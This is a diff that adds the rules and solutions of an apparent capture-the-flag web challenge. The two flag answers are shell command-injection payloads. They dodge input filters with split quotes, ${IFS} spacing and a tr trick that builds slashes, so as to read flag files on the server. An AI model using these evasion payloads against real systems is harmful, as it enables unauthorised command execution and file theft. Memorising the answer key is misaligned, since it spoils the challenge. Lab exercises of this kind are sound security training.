@@ -1,0 +1,8 @@
+RULES
+- No DOS-ing - it does not require brute force.
+- Do not use any protocols except for HTTPS. This challenge does not require SSH, FTP, etc.
+- Do not remove files. I don't want to have to restart Docker.
+
+
+First flag: ;ca''t${IFS}flag.txt
+Second flag: ;ca''t${IFS}$(ech''o${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')home$(ech''o${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')www-data$(ech''o${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')tech2022.txt
